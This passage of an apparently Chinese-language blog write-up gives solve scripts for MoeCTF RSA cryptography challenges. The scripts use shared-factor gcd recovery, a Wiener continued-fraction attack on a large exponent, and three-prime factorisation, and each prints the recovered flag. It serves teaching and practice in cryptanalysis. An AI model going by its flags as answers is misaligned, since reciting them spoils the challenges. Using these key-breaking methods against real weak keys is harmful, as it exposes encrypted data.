class="number">6250115196713939477947942995075509357173312813431601073354390451609559579925704891503987992181988654989477525811826607070378476102616752398280691012244301950194800995432882828020405062344160270290542566163969692748126314259624623341922057435728127596172871894887055305291345372720594481096374310285437492746765510292863238933163142677773310305789984897974266961231555124787205980411992251387207335655129551950825339766848166539671565212408741432649813058363660321480995187545006718837863674527475323414266732366507905974800565463011676462244368010182725161416783875646259625352308599198614681446394427674340328493047</span></span><br><span class="line">n11 = <span class="number">21457499145521259498911107987303777576783467581104197687610588208126845121702391694574491025398113729462454256070437978257494064504146718372095872819969887408622112906108590961892923178192792218161103488204912792358327748493857104191029765218471874759376809136402361582721860433355338373725980783308091544879562698835405262108188595630215081260699112737457564998798692048522706388318528370551365364702529068656665853097899157141017378975007689790000067275142731212069030175682911154288533716549782283859340452266837760560153014200605378914071410125895494331253564598702942990036163269043699029806343766286247742865671</span></span><br><span class="line">c11 = <span class="number">6269656777204332618433779865483197625538144405832409880710764183039800286008967127279281167109250083159801218370191973055663058165456565194979210256278526713608759141588082614531352489547674696723140599892318118960648862531538435596775798128845789504910467783731144808685373807716609662688064728614003904579841055786083326311313295311152563668422289435606771091246147867715987583149743032723028324394173498623642539175178996531881058274717907066845565199058931743481410454382746158558886667761300257488769795092777021292335562818583719708133179974425584610403335487082478848975656282384575767178925517257692365828720</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=[n1,n2,n3,n4,n5,n6,n7,n8,n9,n10,n11]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">        <span class="built_in">print</span> (i,j)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span> (gmpy2.gcd(<span class="built_in">list</span>[i],<span class="built_in">list</span>[j]))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;error &quot;</span>,i)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 10</span></span><br><span class="line"><span class="comment"># 10 2 å¾—åˆ°æœ€å¤§å…¬çº¦æ•° å³ pçš„å€¼ ä¹Ÿå°±æ˜¯n3å’Œn11 ç„¶åå¾—åˆ°q</span></span><br><span class="line">p = <span class="number">147352146484643764031622970604294889624856525072751495442791038251325198568446104214691837421831622655415627526708110986526177662910836604556867226815780490826061784656230373978115117669691022691171484914452586975269776325816859478861737379536769555626991492537714713353640978988383143423169600280639641367257</span></span><br><span class="line"><span class="comment"># 147352146484643764031622970604294889624856525072751495442791038251325198568446104214691837421831622655415627526708110986526177662910836604556867226815780490826061784656230373978115117669691022691171484914452586975269776325816859478861737379536769555626991492537714713353640978988383143423169600280639641367257</span></span><br><span class="line">q = n // p</span><br><span class="line"><span class="comment"># q = 145620540028966886298045317397287868277630293996068891354300317171163102394654200566953231092408905263360354033218015978179750596319737548042877478920021627865879232380251675549484248501442557296855347664700439372652566814092340845895392836187134160213644651413927944852259410982734184261341134137408057812703</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ç„¶åå°±å¯ä»¥å¾—åˆ° d </span></span><br><span class="line">phi = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># d = 13890061244023893571292626230272601124822036844237064294966074036675058019791907857403118959694364662079667353701455067970702476349602825582766915002432252062550689197380881989827812882976807254882992117179688119734038732351242714622278205588117411764221764053934934278123689015741747030943604509682507220348171855015343690151337521301952568174964433189827488310718462972123894168759123552530854537825838122774375389629170816976667180145049794067489681930581496862191275622418116611080426001807586441445849047128039690010523429346460391541771350701269810340239529987096894353991898811080385219506792263057151207002497</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#åœ¨æ ¹æ®d å»æ±‚æ¯ä¸ªçš„c</span></span><br><span class="line">t = q*p</span><br><span class="line"><span class="built_in">list</span>=[c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">    <span class="built_in">print</span> (i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="built_in">pow</span>(<span class="built_in">list</span>[i],d,t))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error &quot;</span>,i)</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">å¾—åˆ°æ¯ä¸€ä¸ªc</span><br><span class="line">c0</span><br><span class="line"><span class="number">5583931503863158448241087778703219729339386877469101650310614267193808645636265780847525270311408662798764494806316792322496772136730882627401956548894582378252647193355732477827456217891613661301980719412550764225447589548809263540915638215544587644746386272967220895968285195684142843647434636534481350856410537207952050965202269455207000853776258252498786445597692354846460259459011433273529099315278115181189426826021073634038282586042758802255159539251744624846425060273914619959089145166186263379268138874174796886123671236544094480824028694661203027024619966084187345594222929651646564476107965383954412435984</span></span><br><span class="line">c1</span><br><span class="line"><span class="number">17889276545398631109985181638075683803666431785407101600436864957616694683569707270903393875295971232004587376322302965260410520501926482253754723159970897416903562022151277550900269792835960721536517928979493572013869752778546707374175957488270200511322881603287930669531221928801843596512070798750295829093868396955003371397967579054767815761130634065444611350656930699963774301141534151599485074550902786461778739084156891486192925774617711065551034004230705907263510387531360551232365340600209203001303918232038821562990305554223273023734302456574527633037037502090726974759626590416964672293931079249637991274807</span></span><br><span class="line">c2</span><br><span class="line"><span class="number">1919303950923990301726092254331108873242521839121646815470639244188317328309694223389909770602853658233546892885121453151964135130873355308839503241193471537929483185859713641325167618250562043522478282534144550850594566643165893025080068633606400022233757710777388416237979384760710964007221147708866762708629866432177005688252216950012286098437990916886219826876935889191342058448950937150541038391788698522041824123925953482340249663213350360417338611716099173404200129764891141839698075343076791890574707491339085711872354878423991799659809600594015341475368054292224354236920521530614364120121697617638462890589</span></span><br><span class="line">c3</span><br><span class="line"><span class="number">15819662230428218945146053851253894429245696511467639405558494810033573174765245205575707990537246997767537225197025031858327494031593337065038660571361398523300542054741132961462297024093500820339195465183004666075661684777565330193923764435435168589163967429767951576451155187963295050564704838868144169526109627667588225338575682532532259140367840339279347253006747470116840354327548941381883752757179247373199292721386476852503947989521479550136358352095998740342043129318511336378603140752957689951019028518420971161260853457608994706151634068382461167748119823459448209255450151019540053434115155746471768758223</span></span><br><span class="line">c4</span><br><span class="line"><span class="number">9912498270048767364937518815088488991017394607781697785154049219576655387213772951061990603603257053248555940042252123521896423945383884115086410019906422461658200497190844980087467834352830645285294672197753723950567279068303417639211098708701705920214950226998970484494492433303596538380528615214754522848882106080937752455436369281541039644810938245372093925127895738664996561522895882573919590981827260378306369665139096476210577740715748606198901230504859115058391700663262864833149196407397847463632082548044765997958811706368460484929856438781493904302944113212251913941059679216276147180219574862660939793212</span></span><br><span class="line">c5</span><br><span class="line"><span class="number">19256037609810856260101951044981441781117528769047030944163855397566234154186632638298908242407660984966861116730046367790637776325252929011960173443587470943679270746407230092486443713769359588651892731958484832393535163466092096060689019573911721642459263449724805795301398729186160505554566366995596371628778559502323439639340301427089672435097223724375396426081908292419478358246772813692133173842148694824724420827167133519122103490955251963651808959652122831068341685627972448103657495100263069990559529220734784528621767182080676393860589410034175942325516581105206675530132486763011188291716144800871045950029</span></span><br><span class="line">c6</span><br><span class="line"><span class="number">20853005096799609956787439577711938116928131852913653884569939872996169131478494107630954813563701963235599506424021498968861609858530382814043597413322113990358387371692314494726890772762603762186424441102457951040437225381340560220037763168627750819553250347865837117715208197263603561499629011920027351866827036567002613657496546509558769265991039126958678683270153333739584013945204184298804497856841055668293980129249602693426129130542791507145366435167902318706570857459009459273021766106516922186355672232155982327174609939626060301076878646548075597966639529559357098109949641111458978656097070245769838190432</span></span><br><span class="line">c7</span><br><span class="line"><span class="number">7766943369159277457688559612135855764282943607086412107316751512719004229867549657804170667177725548208395856948998387112648283436110293459752480792030938440478886375096137616604544391945701044004842429540661600163516598943024168663092728786827935791884016514261155436786516245270802466511976522094694964433368312498109702300804296101419970970233518372347332735527060417948683007902972009195496911122949282777477506589655882306158722560506328545619683359535513525600453189468257112268020819460602197873781931012975661830532458594065083333929186652582309083878502061715370860147523291884212192950343843314289120871850</span></span><br><span class="line">c8</span><br><span class="line"><span class="number">16929615456860049187155331668830881310756198279467226637344416034488859577993256231147734684466900099330043820073076737952119911203721533098997369570656096561996199411163296040127981822205083076476016043235804207441382042547760895720472312222317247781994920125002927326777536198862861957911254815119717280130841516708626547190126590286714725420637352197479059475562943293790711133162378929627077926511567326259088749567159599902070456083023628532680433526793740349943091367370797505193942676361991134211183555786547040830174070876224547967646340199991763473242461846788788168604806594905021464515742730805637619384636</span></span><br><span class="line">c9</span><br><span class="line"><span class="number">11711031069741612148675837088288060089423169664551396153615158703897862859800076345900728345442661150960428389347748869175803214059821781858146871741620298147705921117388689675907133957172866730389446826755971397426800080972249270312761308973152815182174416461996249365341948300139041789646657303330688337432623593775327364059734847195415788148412463650665348316613841346600322586447925839809352042664906410960203667719610787758715539962179593114314449840250688174133403218599150466782655109079732378888230078350274753315565443725878901524716270193579115963303486803347730461897150303142769539854139696662653794202153</span></span><br><span class="line">c10</span><br><span class="line"><span class="number">105729052004695709707494302369697273267327705350547207256718415856738426065458834414702886105339833110865496603092491943242543406994199199351757456420893889035687401880907389</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ç„¶åå¾—åˆ°çš„c11æ˜¯æœ€å°çš„ </span></span><br><span class="line"><span class="comment">#è½¬æˆhexåœ¨è½¬å­—ç¬¦ä¸²è¯•è¯•</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="number">105729052004695709707494302369697273267327705350547207256718415856738426065458834414702886105339833110865496603092491943242543406994199199351757456420893889035687401880907389</span>)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#å¾—åˆ°flag</span></span><br><span class="line"><span class="comment">#b&#x27;moectf&#123;it_is_re@lly_@_signin_level_cryPto_ch@ll@nge_ng92WPIBung92WPIBun&#125;&#x27;</span></span><br></pre></td></tr></table></figure>





<h4 id="giant-e-ã€é«˜æŒ‡æ•°eã€‘"><a href="#giant-e-ã€é«˜æŒ‡æ•°eã€‘" class="headerlink" title="giant_e ã€é«˜æŒ‡æ•°eã€‘"></a>giant_e ã€é«˜æŒ‡æ•°eã€‘</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    flag = fs.read().strip()</span><br><span class="line"> </span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x609778981bfbb26bb93398cb6d96984616a6ab08ade090c1c0d4fedb00f44f0552a1555efec5cc66e7960b61e94e80e7483b9f906a6c8155a91cdc3e4917fa5347c58a2bc85bb160fcf7fe98e3645cfea8458ea209e565e4eb72ee7cbb232331a862d8a84d91a0ff6d74aa3c779b2b129c3d8148b090c4193234764f2e5d9b2170a9b4859501d07c0601cdd18616a0ab2cf713a7c785fd06f27d68dff24446d884644e08f31bd37ecf48750e4324f959a8d37c5bef25e1580851646d57b3d4f525bc04c7ddafdf146539a84703df2161a0da7a368675f473065d2cb661907d990ba4a8451b15e054bfc4dd73e134f3bf7d8fa4716125d8e21f946d16b7b0fc43</span></span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag,<span class="string">&quot;big&quot;</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(n) <span class="comment"># 0xbaa70ba4c29eb1e6bb3458827540fce84d40e1c966db73c0a39e4f9f40e975c42e02971dab385be27bd2b0687e2476894845cc46e55d9747a5be5ca9d925931ca82b0489e39724ea814800eb3c0ea40d89ebe7fe377f8d3f431a68d209e7a149851c06a4e67db7c99fcfd9ec19496f29d59bb186feb44a36fe344f11d047b9435a1c47fa2f8ed72f59403ebb0e439738fd550a7684247ab7da64311690f461e6dce03bf2fcd55345948a3b537087f07cd680d7461d326690bf21e39dff30268cb33f86eeceff412cd63a38f7110805d337dcad25e6f7e3728b53ca722b695b0d9db37361b5b63213af50dd69ee8b3cf2085f845d7932c08b27bf638e98497239</span></span><br><span class="line"><span class="built_in">print</span>(c) <span class="comment"># 0x45a9ce4297c8afee693d3cce2525d3399c5251061ddd2462513a57f0fd69bdc74b71b519d3a2c23209d74fcfbcb6b196b5943838c2441cb34496c96e0f9fc9f0f80a2f6d5b49f220cb3e78e36a4a66595aa2dbe3ff6e814d84f07cb5442e2d5d08d08aa9ccde0294b39bfde79a6c6dcd2329e9820744c4deb34a039da7933ddf00b0a0469afb89cba87490a39783a9b2f8f0274f646ca242e78a326dda886c213bc8d03ac1a9150de4ba08c5936c3fe924c8646652ef85aa7ac0103485f472413427a0e9d9a4d416b99e24861ca8499500c693d7a07360158ffffa543480758cafff2a09a9f6628f92767764fa026d48a9dd899838505ae16e38910697f9de14</span></span><br></pre></td></tr></table></figure>

<p>å·²çŸ¥ n c e ä¸”eä¸ºå¤§æ•°</p>
<p>Wiener Attack ç±»å‹</p>
<p>wpå‚è€ƒ <a href="https://github.com/liuhack/writeups/blob/master/2018/picoCTF/Super_safe_RSA2/README.md">https://github.com/liuhack/writeups/blob/master/2018/picoCTF/Super_safe_RSA2/README.md</a></p>
<p>è„šæœ¬ <a href="https://gist.github.com/mananpal1997/73d07cdc91d58b4eb5c818aaab2d38bd">https://gist.github.com/mananpal1997/73d07cdc91d58b4eb5c818aaab2d38bd</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">0xbaa70ba4c29eb1e6bb3458827540fce84d40e1c966db73c0a39e4f9f40e975c42e02971dab385be27bd2b0687e2476894845cc46e55d9747a5be5ca9d925931ca82b0489e39724ea814800eb3c0ea40d89ebe7fe377f8d3f431a68d209e7a149851c06a4e67db7c99fcfd9ec19496f29d59bb186feb44a36fe344f11d047b9435a1c47fa2f8ed72f59403ebb0e439738fd550a7684247ab7da64311690f461e6dce03bf2fcd55345948a3b537087f07cd680d7461d326690bf21e39dff30268cb33f86eeceff412cd63a38f7110805d337dcad25e6f7e3728b53ca722b695b0d9db37361b5b63213af50dd69ee8b3cf2085f845d7932c08b27bf638e98497239</span></span><br><span class="line">c = <span class="number">0x45a9ce4297c8afee693d3cce2525d3399c5251061ddd2462513a57f0fd69bdc74b71b519d3a2c23209d74fcfbcb6b196b5943838c2441cb34496c96e0f9fc9f0f80a2f6d5b49f220cb3e78e36a4a66595aa2dbe3ff6e814d84f07cb5442e2d5d08d08aa9ccde0294b39bfde79a6c6dcd2329e9820744c4deb34a039da7933ddf00b0a0469afb89cba87490a39783a9b2f8f0274f646ca242e78a326dda886c213bc8d03ac1a9150de4ba08c5936c3fe924c8646652ef85aa7ac0103485f472413427a0e9d9a4d416b99e24861ca8499500c693d7a07360158ffffa543480758cafff2a09a9f6628f92767764fa026d48a9dd899838505ae16e38910697f9de14</span></span><br><span class="line">e = <span class="number">0x609778981bfbb26bb93398cb6d96984616a6ab08ade090c1c0d4fedb00f44f0552a1555efec5cc66e7960b61e94e80e7483b9f906a6c8155a91cdc3e4917fa5347c58a2bc85bb160fcf7fe98e3645cfea8458ea209e565e4eb72ee7cbb232331a862d8a84d91a0ff6d74aa3c779b2b129c3d8148b090c4193234764f2e5d9b2170a9b4859501d07c0601cdd18616a0ab2cf713a7c785fd06f27d68dff24446d884644e08f31bd37ecf48750e4324f959a8d37c5bef25e1580851646d57b3d4f525bc04c7ddafdf146539a84703df2161a0da7a368675f473065d2cb661907d990ba4a8451b15e054bfc4dd73e134f3bf7d8fa4716125d8e21f946d16b7b0fc43</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rational_to_contfrac</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="comment"># Converts a rational x/y fraction into a list of partial quotients [a0, ..., an]</span></span><br><span class="line">    a = x // y</span><br><span class="line">    pquotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        pquotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> pquotients</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convergents_from_contfrac</span>(<span class="params">frac</span>):</span><br><span class="line">    <span class="comment"># computes the list of convergents using the list of partial quotients</span></span><br><span class="line">    convs = [];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frac)): convs.append(contfrac_to_rational(frac[<span class="number">0</span> : i]))</span><br><span class="line">    <span class="keyword">return</span> convs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contfrac_to_rational</span> (frac):</span><br><span class="line">    <span class="comment"># Converts a finite continued fraction [a0, ..., an] to an x/y rational.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(frac) == <span class="number">0</span>: <span class="keyword">return</span> (<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    num = frac[-<span class="number">1</span>]</span><br><span class="line">    denom = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>, -<span class="built_in">len</span>(frac) - <span class="number">1</span>, -<span class="number">1</span>): num, denom = frac[_] * num + denom, num</span><br><span class="line">    <span class="keyword">return</span> (num, denom)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>: <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    g, x, y = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, _ = egcd(a, m)</span><br><span class="line">    <span class="keyword">return</span> (x + m) % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isqrt</span>(<span class="params">n</span>):</span><br><span class="line">    x = n</span><br><span class="line">    y = (x + <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> y &lt; x:</span><br><span class="line">        x = y</span><br><span class="line">        y = (x + n // x) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_rsa</span>(<span class="params">e, n</span>):</span><br><span class="line">    frac = rational_to_contfrac(e, n)</span><br><span class="line">    convergents = convergents_from_contfrac(frac)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if x*x - s*x + n = 0 has integer roots</span></span><br><span class="line">            D = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> D &gt;= <span class="number">0</span>:</span><br><span class="line">                sq = isqrt(D)</span><br><span class="line">                <span class="keyword">if</span> sq * sq == D <span class="keyword">and</span> (s + sq) % <span class="number">2</span> == <span class="number">0</span>: <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = crack_rsa(e, n)</span><br><span class="line">m = <span class="built_in">hex</span>(<span class="built_in">pow</span>(c, d, n)).rstrip(<span class="string">&quot;L&quot;</span>)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;moectf&#123;too_larGe_exponent_is_not_a_iDea_too!_Bung92WPIBung92WPIBung9?WP&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h4 id="factorize-me-ã€åˆ†è§£nä¸º3ä¸ªç´ æ•°ã€‘"><a href="#factorize-me-ã€åˆ†è§£nä¸º3ä¸ªç´ æ•°ã€‘" class="headerlink" title="factorize_me! ã€åˆ†è§£nä¸º3ä¸ªç´ æ•°ã€‘"></a>factorize_me! ã€åˆ†è§£nä¸º3ä¸ªç´ æ•°ã€‘</h4><p>DESCRIPTION: can you factorize me?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> prod</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choices</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    flag = fs.read().strip()</span><br><span class="line"></span><br><span class="line">primes = [getPrime(<span class="number">512</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;prod(primes) = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;prod(p - <span class="number">1</span> <span class="keyword">for</span> p <span class="keyword">in</span> primes) = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">primes2 = [nextprime(p) <span class="keyword">for</span> p <span class="keyword">in</span> choices(primes, k=<span class="number">3</span>)]</span><br><span class="line">n = prod(primes2)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(<span class="built_in">int</span>.from_bytes(flag, <span class="string">&#x27;big&#x27;</span>), e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 363364907814244019888662301376841344262476227242899756862391470731421569394957444030214887114615748277199649349781524749919652160244484352285668794188836866602305788131186220057989320357344904731322223310531945208433910803617954798258382169132907508787682006064930747033681966462568715421005454243255297306718356766130469885581576362173340673516476386201173298433892314145854649884922769732583885904512624543994675379894718657682146178638074984373206937523380103438050549181568015985546172618830480078894445808092527561363650503540062128543705172678754195578429520889784813733491180748361345720247750720179608752244490362713103319685024237941527268458213442611663415417005556439749055222361212059968254748751273361732365487788593341859760309778894350385339764442343374673786357175846291309425081492959910254127778240522152676060766139057453197528944251599979227271074508795482632471242983094008619339488744362509349734218480932255216087706001484182136783834973304870508270118505737767002256270427907341952256516206663258530300791364944105025764611810001781971638030661367630116818647252727909489405550104641122269772492252464714694507693447974171377200402508765841829763548525530878309985480248379655169722567051495205792089930014228403456098065971372039443284193603395249634283366194562380309469628114581468645669390610963076340643757972439104287127375438663839421605531570285615180251</span></span><br><span class="line"><span class="comment"># 363364907814244019888662301376841344262476227242899756862391470731421569394957444030214887114615748277199649349781524749919652160244484352285668794188836492373364350673588273863828369502073826782362255108313852264064760467561392054178047091483873483255491431451728274259516789065331176728192953741805933100379191778599394515981288225535175013258094287912195847642598436035132783919453991516358280321085873745330313812205910011387125778714795906023110368957596998222544234082487264006696812862179916726781327290284827659294751262185328816323311831349296593013038823107653943652771448719760448938995150646738377177532550757319539185878535087009904848382493668686831331474113789651777885239747000076063679062106375348803749466079052774597412239427050432901553466002731972993029311850718200685157193170716432600165476733200831046297530470544781309612128231925681374239849452623513538498417735984094919756374577623486416462101457492789215144166273775249387638107644634704270216130852885082174564648445147377239033930079759024399532146184753110240154062693457622208373371290126810856885343328090305620627668495081760346853701632815149478447405718664667978825807101325764916405446176183238866136433205933785973568759281210319422288153910340542098573782006262190181726245838857185687242960093445000287347616796984610291664809895901301187179157382169999966124177588884152267266994164841066291200</span></span><br><span class="line"><span class="comment"># n = 899081756851564072995842371038848265712822308942406479625157544735473115850983700580364485532298999127834142923262920189902691972009898741820291331257478170998867183390650298055916005944577877856728843264502218692432679062445730259562784479410120575777748292393321588239071577384218317338474855507210816917917699500763270490789679076190405915250953860114858086078092945282693720016414837231157788381144668395364877545151382171251673050910143023561541226464220441</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># c = 841335863342518623856757469220437045493934999201203757845757404101093751603513457430254875658199946020695655428637035628085973393246970440054477600379027466651143466332405520374224855994531411584946074861018245519106776529260649700756908093025092104292223745612991818151040610497258923925952531383407297026038305824754456660932812929344928080812670596607694776017112795053283695891798940700646874515366341575417161087304105309794441077774052357656529143940010140</span></span><br></pre></td></tr></table></figure>

<p>å·²çŸ¥ n c e </p>
<p>nå¯ä»¥é€šè¿‡factordb.com åˆ†è§£æˆä¸‰ä¸ªæ•° p q r</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">6991223361118904775931217829045348785013077549030883418924453538830605687999480005714979700653172534877541317997174968789510984315425270755055110913347349</span></span><br><span class="line">q = <span class="number">9987009117206906203158749743824168660291275882852229158070368815160479543708376165641735042845357978292384303332559592302507789120810447986634662721490849</span></span><br><span class="line">r = <span class="number">12876877424944854147075816504195994138450356002779004886384584287813869165469217718717854027672044903401715370348223932937626725119320180795716270261309141</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"> </span><br><span class="line">n = <span class="number">899081756851564072995842371038848265712822308942406479625157544735473115850983700580364485532298999127834142923262920189902691972009898741820291331257478170998867183390650298055916005944577877856728843264502218692432679062445730259562784479410120575777748292393321588239071577384218317338474855507210816917917699500763270490789679076190405915250953860114858086078092945282693720016414837231157788381144668395364877545151382171251673050910143023561541226464220441</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">841335863342518623856757469220437045493934999201203757845757404101093751603513457430254875658199946020695655428637035628085973393246970440054477600379027466651143466332405520374224855994531411584946074861018245519106776529260649700756908093025092104292223745612991818151040610497258923925952531383407297026038305824754456660932812929344928080812670596607694776017112795053283695891798940700646874515366341575417161087304105309794441077774052357656529143940010140</span></span><br><span class="line"> </span><br><span class="line">p = <span class="number">6991223361118904775931217829045348785013077549030883418924453538830605687999480005714979700653172534877541317997174968789510984315425270755055110913347349</span></span><br><span class="line">q = <span class="number">9987009117206906203158749743824168660291275882852229158070368815160479543708376165641735042845357978292384303332559592302507789120810447986634662721490849</span></span><br><span class="line">r = <span class="number">12876877424944854147075816504195994138450356002779004886384584287813869165469217718717854027672044903401715370348223932937626725119320180795716270261309141</span></span><br><span class="line"> </span><br><span class="line">phi_n=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi_n)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="comment">#print(m)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;moectf&#123;you_KNow_how_to_faCtorize_N_right?_9?WPIBung6?WPIBung6?WPIBund6?&#125;&#x27;</span></span><br></pre></td></tr></table></figure>





